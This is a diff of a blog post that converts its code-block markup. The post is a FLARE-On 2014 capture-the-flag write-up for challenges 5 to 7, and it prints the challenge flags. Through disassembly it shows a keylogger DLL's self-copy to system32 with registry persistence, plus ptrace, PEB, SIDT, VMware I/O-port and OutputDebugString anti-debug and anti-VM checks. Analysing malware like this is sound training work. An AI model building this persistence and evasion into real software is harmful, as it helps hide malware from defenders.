 If ``GetModuleHandleEx`` was successful it will land here. [GetModuleFileName](http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx) is called which will return the full path for the specified module in ``hModule``. In this case, the binary retrieves its own path (line 9) and saves it in ``[ebp+Filename]``. In line 10, return value of ``sub_1000A570`` is compared with 2.
 
-{{< codecaption lang="nasm" title="Getting Dll path" >}}
+{% codeblock lang:nasm Getting Dll path >}}
 
 .text:1000A711
 .text:1000A711 loc_1000A711:
@@ -657,11 +663,11 @@ If ``GetModuleHandleEx`` was successful it will land here. [GetModuleFileName](h
 .text:1000A724 call    ds:GetModuleFileNameA
 .text:1000A72A cmp     [ebp+var_110], 2           ; comparing return value of sub_1000A570 with 2
 .text:1000A731 jnz     short loc_1000A772         ; if return value is not 2, then jump to loc_1000A772
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 If registry key did not exist, we will continue.
 
-{{< codecaption lang="nasm" title="CopyFile" >}}
+{% codeblock lang:nasm CopyFile >}}
 
 .text:1000A733 mov     [ebp+lpNewFileName], offset aCWindowsSystem ; "c:\\windows\\system32\\svchost.dll"
 .text:1000A73D mov     [ebp+var_124], offset aCWindowsSyst_0 ; "c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll"
@@ -677,11 +683,11 @@ If registry key did not exist, we will continue.
 .text:1000A769 add     esp, 4
 .text:1000A76C mov     [ebp+var_114], eax
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 We have already seen the strings being loaded in lines 1 and 2. Then ``CopyFile`` is called to copy itself to ``c:\\windows\\system32\\svchost.dll``.
 
-{{< codecaption lang="nasm" title="sub_1000A610" >}}
+{% codeblock lang:nasm sub_1000A610 >}}
 
 .text:1000A610 push    ebp
 .text:1000A611 mov     ebp, esp
@@ -718,7 +724,7 @@ We have already seen the strings being loaded in lines 1 and 2. Then ``CopyFile`
 .text:1000A675 pop     ebp
 .text:1000A676 retn
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Line 9 pushes ``c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll`` to the stack and calls ``sub_1000A610`` in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.
 
@@ -729,7 +735,7 @@ If call was successful, execution continues to line 14. It is adding a new regis
 *The Dll copied itself to system32 and it will run every time Windows starts*.
 
 
-{{< codecaption lang="nasm" title="Returning from sub_1000A610" >}}
+{% codeblock lang:nasm Returning from sub_1000A610 >}}
 
 .text:1000A757 call    ds:CopyFileA
 .text:1000A75D mov     ecx, [ebp+var_124]
@@ -750,7 +756,7 @@ If call was successful, execution continues to line 14. It is adding a new regis
 .text:1000A790 _DllMain@12 endp
 .text:1000A790
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 After we return from ``sub_1000A610``, we land in line 5. Return value will be saved in ``var_114`` (0 is key was created). If we highlight this variable and press ``x`` in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called ``sub_1000A4C0``. Let's go inside.
 
@@ -758,7 +764,7 @@ After we return from ``sub_1000A610``, we land in line 5. Return value will be s
 
 Inside ``sub_1000A4C0`` we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let's look at the other branch.
 
-{{< codecaption lang="nasm" title="sub_1000A4C0" >}}
+{% codeblock lang:nasm sub_1000A4C0 >}}
 
 .text:1000A4D3 call    _rand
 .text:1000A4D8 cdq
@@ -797,11 +803,11 @@ Inside ``sub_1000A4C0`` we can see that the jump to return is never taken. Becau
 .text:1000A531 mov     [ebp+var_14], eax    ; var_14 = sub_10009EB0()
 .text:1000A534 cmp     [ebp+var_14], 0
 .text:1000A538 jz      short loc_1000A55
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Line 1 calls ``rand`` and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for ``malloc``. So a random number of bytes are allocated. Seems like it is allocating an array of type ``size_t``. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the ``malloc``, the pointer to the allocated memory is stored in ``var_C``. In lines 13-19 we see that this array is reset to zero by ``memset``. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call ``sub_10009EB0``.
 
-{{< codecaption lang="nasm" title="sub_10009EB0" >}}
+{% codeblock lang:nasm sub_10009EB0 >}}
 
 .text:10009EB0 sub_10009EB0 proc near
 .text:10009EB0
@@ -836,7 +842,7 @@ Line 1 calls ``rand`` and the result is modified a few times by doing some calcu
 .text:10009EC9 mov     [ebp+var_4], cx ; (var_4)++
 ; go back to line 14
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 This is what we are looking for. First ``var_4`` is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to ``loc_1000A3A4``.
 
@@ -849,7 +855,7 @@ Now we know that the application loops through ascii characters from 0 to 222 ch
 
 This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from ``0x27`` to ``0x60``. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for ``M`` or ``0x4D`` caught my eye. Finding the code for ``M`` and clicking on the red arrow besides it.
 
-{{< codecaption lang="nasm" title="If M is pressed" >}}
+{% codeblock lang:nasm If M is pressed >}}
 .text:1000A1B6 loc_1000A1B6:
 .text:1000A1B6 movsx   eax, [ebp+var_4]
 .text:1000A1BA cmp     eax, 4Dh
@@ -857,7 +863,7 @@ This code is a series of cases for a switch statement (as IDA has detected). It 
 
 .text:1000A1BF call    sub_10009AF0
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 What is ``sub_10009AF0``?
 
@@ -883,7 +889,9 @@ Notice the ``o``? Now see that variable ``dword_100194F8`` needs to be 1 to reac
 
 So we have ``m`` and then ``o``. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to ``svchost.log``.
 
-#### Level 5 flag: l0gging.Ur.5tr0ke5@flare-on.com
+{% codeblock Flag 5 >}}
+l0gging.Ur.5tr0ke5@flare-on.com
+{% endcodeblock >}}
 
 ---
 
@@ -899,16 +907,16 @@ While I was writing this solution, I saw this alternative way of solving the cha
 
 New binary. Named ``e7bc5d2c0cf4480348f5504196561297``. Let's google it and [first result](http://pedump.me/e7bc5d2c0cf4480348f5504196561297/) is interesting. Filename has the ``exe`` extension but it is a 64-bit ELF executable. Opening the file in ``HxD`` shows us the ELF magic bytes.
 
-{{< codecaption lang="bash" title="Info from pedumpme" >}}
+{% codeblock lang:bash Info from pedumpme >}}
 filename  spyEye1.4.exe
 size      1221064 (0x12a1c8)
 md5       e7bc5d2c0cf4480348f5504196561297
 type      ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM. 
 
-{{< codecaption lang="bash" title="Running commands" >}}
+{% codeblock lang:bash Running commands >}}
 # the same as the website
 $ file e7bc5d2c0cf4480348f5504196561297 
 e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
@@ -950,11 +958,11 @@ stahp
 # four arguments - message is the same - we should stop 
 $ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
 stahp
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. 'A'*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran ``ltrace`` and didn't see any shared library calls. Let's run ``strace`` to get system calls.
 
-{{< codecaption lang="bash" title="strace output" >}}
+{% codeblock lang:bash strace output >}}
 $ strace ./e7bc5d2c0cf4480348f5504196561297
 execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"...], [/* 31 vars */]) = 0
 uname({sys="Linux", node="kali", ...})  = 0
@@ -998,15 +1006,15 @@ write(1, "Program received signal SIGSEGV,"..., 52Program received signal SIGSEG
 exit_group(9001)                        = ?
 
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Syscalls are similar in all traces except with two arguments. We can see that ``ptrace`` is being called in line 37. It's a common [anti-debug protection](http://reverseengineering.stackexchange.com/a/1931) in Linux. "[a]n executable can only call ptrace once. if ptrace() was already called by the strace executable, we can detect it in runtime." So we need to bypass ``ptrace``. Searching for ``ptrace`` in IDA does not turn up anything. I learned that syscalls are not called that way by name (he he). The argument for ``syscall`` is moved to ``eax`` and then it is called. So I search for the text ``syscall`` in IDA and then commented each call according to [Linux System Call Table for x86_64](http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64) by ``@pixnbits``. ``ptrace`` is ``0x65``:
 
 ![ptrace call](/images/2014/flare/6-1.jpg "ptrace call")
 
-Later I realized there was a much easier way to find it instead of discovering all calls. Running ``strace`` with ``-i`` switch will print the instruction pointer ~~at the time of call~~ after the syscall returns. Let's run ``ptrace`` on the binary with two arguments with this new swtich and look at the results.
+Later I realized there was a much easier way to find it instead of discovering all calls. Running ``strace`` with ``-i`` switch will print the instruction pointer at the time of call. Let's run ``ptrace`` on the binary with two arguments with this new swtich and look at the results.
 
-{{< codecaption lang="bash" title="strace -i" >}}
+{% codeblock lang:bash strace -i >}}
 $ strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
 [    7f87e90646e7] execve("./e7bc5d2c0cf4480348f5504196561297", ["./e7bc5d2c0cf4480348f55041965612"..., "arg1", "arg2"], [/* 31 vars */]) = 0
 [          4a9297] uname({sys="Linux", node="kali", ...}) = 0
@@ -1021,13 +1029,13 @@ $ strace -i ./e7bc5d2c0cf4480348f5504196561297 arg1 arg2
 [          473f50] write(1, "Program received signal SIGSEGV,"..., 52Program received signal SIGSEGV, Segmentation fault) = 52
 [          473dd8] exit_group(9001)     = ?
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Look at IP at the time of ``ptrace`` in line 9: ``47431b``. Now look at the IDA screenshot above.
 
 So this function calls ``ptrace``. To find out where this function is being called, highlight it and press ``x`` in IDA. There is only one call.
 
-{{< codecaption lang="nasm" title="bypassing ptrace" >}}
+{% codeblock lang:nasm bypassing ptrace >}}
 .text:000000000041F1F8 B9 00 00 00    mov     ecx, 0
 .text:000000000041F1FD BA 01 00 00    mov     edx, 1
 .text:000000000041F202 BE 00 00 00    mov     esi, 0
@@ -1043,7 +1051,7 @@ So this function calls ``ptrace``. To find out where this function is being call
 .text:000000000041F228 BF 29 23 00    mov     edi, 2329h
 .text:000000000041F22D E8 5E F5 03    call    sub_45E790
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Return value from ``ptrace`` is manipulated and then checked to see if it is zero. If non-zero, the program continues to line 11 and prints the segfault message in line 12 (I have renamed it). As you have noticed I have enabled opcodes in the last code snippet. In IDA go to the ``Option`` menu and then ``General``. Change the ``number of opcode bytes``.
 
@@ -1059,7 +1067,7 @@ I chose option 2, searched for string instructions and assigned breakpoints. Aft
 What does ``repne scasb`` do?  
 ``repne scasb`` will scan the string in ``di/edi/rdi`` for the byte (``scasb`` is the byte version of ``scas`` instruction) in ``ax/eax/rax`` and decrease ``cx/ecx/rcx`` by one after each execution. It stops if ``cx/ecx/rcx`` reaches zero or if a match is found.
 
-{{< codecaption lang="nasm" title="strlen" >}}
+{% codeblock lang:nasm strlen >}}
 
 .text:00000000004370CF mov     rax, [rbp+var_3C0]
 .text:00000000004370D6 add     rax, 8
@@ -1077,11 +1085,11 @@ What does ``repne scasb`` do?
 .text:0000000000437106 cmp     rax, 0Ah        ; if ( strlen(arg1) == 10 ) jump
 .text:000000000043710A jz      short strlen_arg1_equals_10
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Null terminator or ``0x00`` is saved in eax in line 6. Line 7 has ``rcx``. We don't want ``rcx`` to reach zero before the end of the string. First argument is saved in ``rdi`` in line 8 and finally line 9 calls ``repne scasb``. This is basically ``strlen(arg1)``. In line 14, it is checked if the length of first argument is 10. If so we will jump. 
 
-{{< codecaption lang="nasm" title="strlen_arg1_equals_10" >}}
+{% codeblock lang:nasm strlen_arg1_equals_10 >}}
 
 .text:0000000000437120 strlen_arg1_equals_10:  ; strlen(arg1) == 10 Decimal
 .text:0000000000437120 mov     rax, [rbp+var_3C0]
@@ -1093,11 +1101,11 @@ Null terminator or ``0x00`` is saved in eax in line 6. Line 7 has ``rcx``. We do
 .text:000000000043713D mov     [rbp+counter_?], 0
 .text:0000000000437147 jmp     short loc_437177
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 We can see that arg1 is saved to ``rdi`` in line 5 and ``sub_468BB0`` is called. We can get inside ``sub_468BB0`` but it is basically ``malloc``. It allocates a string and initializes it with first argument. Return value is in ``rax`` which is a pointer to the newly created string. It is saved to ``[rbp+arg1_2]`` (I have renamed the variables). Finally there is an unconditional jump.
 
-{{< codecaption lang="nasm" title="loc_437177" >}}
+{% codeblock lang:nasm loc_437177 >}}
 
 .text:0000000000437177 loc_437177:
 .text:0000000000437177 mov     eax, [rbp+counter_?]
@@ -1132,20 +1140,20 @@ We can see that arg1 is saved to ``rdi`` in line 5 and ``sub_468BB0`` is called.
 .text:0000000000437170 add     [rbp+counter_?], 1
 ; jumps back to top
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 We see another ``repne scasb``. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with ``0x56``.
 
-{{< codecaption lang="cpp" title="loc_437177" >}}
+{% codeblock lang:cpp loc_437177 >}}
 for (int i=0; i<11 ; i++) 
 { 
   arg1[i] = arg1[i] ^ 0x56; 
 }
-{{< /codecaption >}}
+{% endcodeblock>}}
 
 If the loop is done, the ``jnz`` in line 19 will not be triggered and we land somewhere else.
 
-{{< codecaption lang="nasm" title="Comparison" >}}
+{% codeblock lang:nasm Comparison >}}
 
 .text:00000000004371C1 mov     rax, [rbp+arg1_2] ; arg1 xor 0x56
 .text:00000000004371C8 mov     edx, 0Ah
@@ -1155,16 +1163,16 @@ If the loop is done, the ``jnz`` in line 19 will not be triggered and we land so
 .text:00000000004371DA test    eax, eax         ; if function is successful, will return 0
 .text:00000000004371DC jz      short loc_4371F2 ; jumps if return value = 0
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Application loads the string ``bngcg`debd`` and compares the result of ``arg1 xor 0x56`` with it. If both are equal, ``jz`` in line 7 will be taken.  
 We have already seen the transitive property of xor so we can calculate the correct value of first argument which is ``4815162342``. We could also patch the ``jz`` to ``jmp`` and enter any 10 characters for argument one.
 
-{{< codecaption lang="cpp" title="First argument" >}}
+{% codeblock lang:cpp First argument >}}
 arg1 xor 0x56 = "bngcg`debd"
 arg1 = "bngcg`debd" xor 0x56
 arg1 = "4815162342"
-{{< /codecaption >}}
+{% endcodeblock>}}
 
 Now it gets a bit hazy and very painful. There are tons of loops and function calls. Some random strings are loaded in different functions and not used for anything. I started to see patterns such as this instruction ``mov  cs:byte_729AC2, al``. At that address, there are bytes being written and they are in ``base64``. I was stepping through until suddenly everything stopped and I saw that a ``nanosleep`` syscall was executed.
 
@@ -1172,7 +1180,7 @@ Now it gets a bit hazy and very painful. There are tons of loops and function ca
 
 I patched it and continued. Application crashed a few times in between and I had to get back to my latest breakpoint. I got into the habit of copying the base64 bytes and setting up breakpoints every once in a while to get back to a checkpoint after each crash. Finally all the bytes were written and [sub_401164](https://twitter.com/FireEye/status/496757071644487680) was called. This function decodes the bytes from base64 (although I though it is a different implementation and stepped through it for an hour before realizing that it is just a standard decoder).
 
-{{< codecaption lang="nasm" title="Checking argument 2" >}}
+{% codeblock lang:nasm Checking argument 2 >}}
 [stack]:00007FFF3A5AC39C  ; ---------------------------------------------------------------------------
 
 [stack]:00007FFF3A5AC39C  loc_7FFF3A5AC39C:
@@ -1192,13 +1200,13 @@ I patched it and continued. Application crashed a few times in between and I had
 [stack]:00007FFF3A5AC3B8  jmp     rbx
 ...
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example ``arg2[0] ror 0xF2 must equal 0x1B``, otherwise ``jz`` will be called and application will terminate in ``loc_7FFF3A5AC3A6``. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.
 
 Python does not have ``ror`` and ``rol`` binary operators so I stole them from [here](http://www.falatic.com/index.php/108/python-and-bitwise-rotation). 
 
-{{< codecaption lang="python" title="Second argument" >}}
+{% codeblock lang:python Second argument >}}
 # rol and ror implementations taken from 
 # http://www.falatic.com/index.php/108/python-and-bitwise-rotation
 
@@ -1270,11 +1278,13 @@ print ''.join(map(chr, arg2))
 # output
 l1nhax.hurt.u5.a1l@flaZZZZZZZZZZ
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Thanks [@Wartortell](https://twitter.com/Wartortell).
 
-#### Level 6 flag: l1nhax.hurt.u5.a1l@flare-on.com
+{% codeblock Flag 6 >}}
+l1nhax.hurt.u5.a1l@flare-on.com
+{% endcodeblock >}}
 
 ---
 
@@ -1290,7 +1300,7 @@ By this time we have already fallen into a pre-check routine. Filename is ``d696
 PE-Studio stuff:
 
 * Win32 executable
-* VirusTotal score: 5 / 55
+* VirusTotal score: 5/55
 * Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. ``wininet.dll`` is for the interwebz
 * Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff
 * Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting
@@ -1301,14 +1311,14 @@ I searched for [gethostbyname](http://msdn.microsoft.com/en-us/library/windows/d
 
 ![Dogecoin](/images/2014/flare/7-1.jpg "Dogecoin")
 
-{{< codecaption lang="powershell" title="Calls for gethostbyname" >}}
+{% codeblock Calls for gethostbyname >}}
 gethostbyname ( "www.dogecoin.com" )
 gethostbyname ( "e.root-servers.net" )
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 I was curious about these connections so I captured the traffic using ``Wireshark`` from launch to crash. 
 
-{{< codecaption lang="powershell" title="Traffic summary - some lines omitted" >}}
+{% codeblock Traffic summary - some lines omitted >}}
 
 10.0.2.15	192.168.1.1	DNS	76	Standard query 0xbbc7  A www.dogecoin.com
 192.168.1.1	10.0.2.15	DNS	106	Standard query response 0xbbc7  CNAME dogecoin.com A 204.232.175.78
@@ -1325,16 +1335,11 @@ I was curious about these connections so I captured the traffic using ``Wireshar
 199.16.156.198	10.0.2.15	TLSv1	1431	Application Data
 199.16.156.198	10.0.2.15	TLSv1	1474	Application Data
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Query for ``www.dogecoin.com``, ``e.root-servers.net`` and ``www.twitter.com``. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let's search for "twitter" in API Monitor and we see this ``InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )``. Let's find that tweet and it looks normal.
 
 ![When embed tweet plugins for Octopress don't work](/images/2014/flare/7-2.jpg "When embed tweet plugins for Octopress don't work")
-
-After migrating to [Hugo](https://gohugo.io), I can embed tweets now.
-
-{{< tweet 484033515538116608 >}}
-
 
 Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.
 
@@ -1350,7 +1355,7 @@ Find ``main`` and put a breakpoint on it. As we go through main we reach a bunch
 
 #### Function 1 - isDebuggerPresent?
 
-{{< codecaption lang="nasm" title="" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    sub_401030   ; you are here
 .text:00401B18 call    sub_4010C0
 .text:00401B1D call    sub_401130
@@ -1364,7 +1369,7 @@ Find ``main`` and put a breakpoint on it. As we go through main we reach a bunch
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![isDebuggerPresent](/images/2014/flare/7-3.jpg "isDebuggerPresent")
 
@@ -1372,17 +1377,17 @@ The result of a function call ``isDebuggerPresent`` is compared with 0 by ``test
 
 If debugger is present, we go left and the string ``oh happy dayz`` is xor-ed with the blob. If no debugger is present, we jump to the right branch and string ``the final countdown`` is xor-ed with the ``blob``.
 
-{{< codecaption lang="python" title="isDebuggerPresent" >}}
+{% codeblock lang:python isDebuggerPresent >}}
 if (isDebuggerPresent):
     blob = xor(blob,"oh happy dayz")
 else:
     blob = xor(blob,"the final countdown")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 
 #### Function 2 - BeingDebugged?
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    sub_4010C0    ; you are here
 .text:00401B1D call    sub_401130
@@ -1396,7 +1401,7 @@ else:
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 Let's forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting ``var_4`` to zero. The next jump will only happen if ``var_4`` is zero which means that the last jump should not have happened. If the first compare succeeds (meaning ``[eax+2]`` is 1) then we go left and otherwise right.
 
@@ -1412,15 +1417,15 @@ Looking inside ``sub_401000``. At the start ``blob_length`` is loaded into ``ecx
 
 Now let's go back to the first compare.
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:004010C6 mov     [ebp+var_4], 1
 .text:004010CD mov     eax, large fs:30h
 .text:004010D3 cmp     byte ptr [eax+2], 1
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 What is the significance of ``fs:30h``? It is the ``Process Environment Block (PEB)`` in the ``Thread Information Block (TIB)``. According to [MSDN](http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx) it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called ``BeingDebugged`` and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and ``UNACCEPTABLE!`` will be xor-ed with the ``blob`` otherwise ``omglob``. More information about the ``PEB`` can be found in the first section of the PDF ``1.NtGlobalFlag``.
 
-{{< codecaption lang="cpp" title="PEB Structure" >}}
+{% codeblock lang:cpp PEB Structure >}}
 
 typedef struct _PEB {
   BYTE                          Reserved1[2];
@@ -1437,20 +1442,20 @@ typedef struct _PEB {
   ULONG                         SessionId;
 } PEB, *PPEB;
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 At this point we can rewrite this function in Python
 
-{{< codecaption lang="python" title="BeingDebugged" >}}
+{% codeblock lang:python BeingDebugged >}}
 if (BeingDebugged):
     blob = xor(blob,"UNACCEPTBALE!")
 else:
     blob = xor(blob,"omglob")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 3 - VMware Detection via Red Pill
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B13 call    calls_isDebuggerPresent
 .text:00401B18 call    BeingDebugged
@@ -1465,7 +1470,7 @@ else:
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![SIDT Red Pill](/images/2014/flare/7-7.jpg "SIDT Red Pill")
 
@@ -1475,15 +1480,13 @@ But how is this accomplished? Each core has one register called the ``Interrupt 
 
 According to [this post](http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html) by Alain Zidouemba these are some of the addresses:
 
-    |
-    | VM Manager |   Address  |
-    |------------|------------|
-    | Windows    | 0x80FFFFFF |
-    | Virtual PC | 0xE8XXXXXX |
-    | VMware     | 0xFFXXXXXX |
-    |
+| VM Manager | Address |
+|:---| :---|
+| Windows | 0x80FFFFFF |
+| Virtual PC | 0xE8XXXXXX|
+| VMware | 0xFFXXXXXX |
 
-{{< codecaption lang="nasm" title="SIDT Red Pill" >}}
+{% codeblock lang:nasm SIDT Red Pill >}}
 
 .text:00401138 sidt    fword ptr [ebp+var_8]
 .text:0040113C mov     edi, dword ptr [ebp+var_8+2] ; edi = IDT address (in this run 0xBAB3C590)
@@ -1494,20 +1497,20 @@ According to [this post](http://vrt-blog.snort.org/2009/10/how-does-malware-know
 .text:0040114E cmp     eax, 0FF000000h              ; Comparing the first byte with 0xFF
 .text:00401153 jnz     short loc_40119A
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 The above compares the first byte of IDT address with ``0xFF``. According to our table it is looking for ``VMware``. But we are not running it. If this check passes (meaning we are not running VMware) the string ``you're so bad`` is going to be xor-ed with the blob, otherwise it will be ``you're so good``. The address ``0xBAB3C590`` did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.
 
-{{< codecaption lang="python" title="VMware Detection via Red Pill" >}}
+{% codeblock lang:python VMware Detection via Red Pill >}}
 if (running_in_vmware):
     blob = xor(blob,"you're so good")
 else:
     blob = xor(blob,"you're so bad")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 4 - VMware Detection 2: Electric Boogaloo
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1521,7 +1524,7 @@ else:
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
 
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 What's in the box?
 
@@ -1529,13 +1532,13 @@ What's in the box?
 
 Function will create its own exception handler, it will return the execution to ``loc_401232`` if an exception occurs. Then we have some interesting instructions. If we look at the [Malware Bytes](https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/) article, it is named ``VMware I/O port``. These are the magic instructions:
 
-{{< codecaption lang="nasm" title="VMware I/O port check" >}}
+{% codeblock lang:nasm VMware I/O port check >}}
 .text:0040120E mov     eax, 564D5868h   ; save magic number to eax
 .text:00401213 mov     ecx, 0Ah
 .text:00401218 mov     dx, 5658h
 .text:0040121C in      eax, dx          ; if in VMware, this instruction will save the magic number in ebx
 .text:0040121D mov     [ebp+var_1C], ebx    ; executes if in VMware otherwise exception
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 It's a quick way to find if the application is running in a VMware VM. If ``in eax, dx`` is successful, it will save the magic number in ``ebx`` and then ``var_1C``. If not, it will raise an exception. But the function has an exception handler and execution will be transferred back to the function. Then ``var_1C`` is compared to the magic number to determine if the application is in a VMware VM or not.
 
@@ -1545,16 +1548,16 @@ I was running the application in VirtualBox. Apparently Fireeye thinks we are al
 
 The rest of the function is pretty simple, if the check fails ``0x66`` (character ``f``) will be xor-ed with the blob. If running in VMware ``0x01``.
 
-{{< codecaption lang="python" title="VMWare Detection 2" >}}
+{% codeblock lang:python VMWare Detection 2 >}}
 if (running_in_vmware):
     blob = xor(blob,0x01)
 else:
     blob = xor(blob,0x66)
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 5 - OutputDebugString
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1567,22 +1570,22 @@ else:
 .text:00401B3D call    sub_4014F0
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 ![OutputDebugString](/images/2014/flare/7-10.jpg "OutputDebugString")
 
 This is almost the same as listing 16-1 in page 353 of ``Practical Malware Analysis`` book ([Link to p.353 on Google Books](http://books.google.com/books?id=FQC8EPYy834C&pg=PA353&dq=outputdebugstring&hl=en&sa=X&ei=lcksVI7JM9bGsQSdpoGACA&ved=0CDsQ6AEwBQ#v=onepage&q=outputdebugstring&f=false)). First the current error code is set to ``0x1234``. Then ``OutputDebugString`` is called with string ``bah!``. An error occurs if a debugger is not attached to the application and current error code changes, otherwise there is no error and last error code remains ``0x1234``. Later, last error code is retrieved by calling ``GetLastError``, if this value is not changed then a debugger is attached to the application and string ``Sandboxes are fun to play in`` is xor-ed with blob. In the absence of a debugger, ``I'm gonna sandbox your face`` is used.
 
-{{< codecaption lang="nasm" title="OutputDebugString" >}}
+{% codeblock lang:nasm OutputDebugString >}}
 if(debugger_is_attached):
     blob = xor(blob,"Sandboxes are fun to play in")
 else:
     blob = xor(blob, "I'm gonna sandbox your face")
-{{< /codecaption >}}
+{% endcodeblock >}}
 
 #### Function 6 - I Can Haz Breakpoint?
 
-{{< codecaption lang="nasm" >}}
+{% codeblock lang:nasm >}}
 .text:00401B13 call    isDebuggerPresent
 .text:00401B18 call    BeingDebugged
 .text:00401B1D call    VMware_detection
@@ -1595,13 +1598,13 @@ else:
 .text:00401B3D call    sub_4014F0
 .text:00401B42 call    sub_401590
 .text:00401B47 call    sub_4016F0
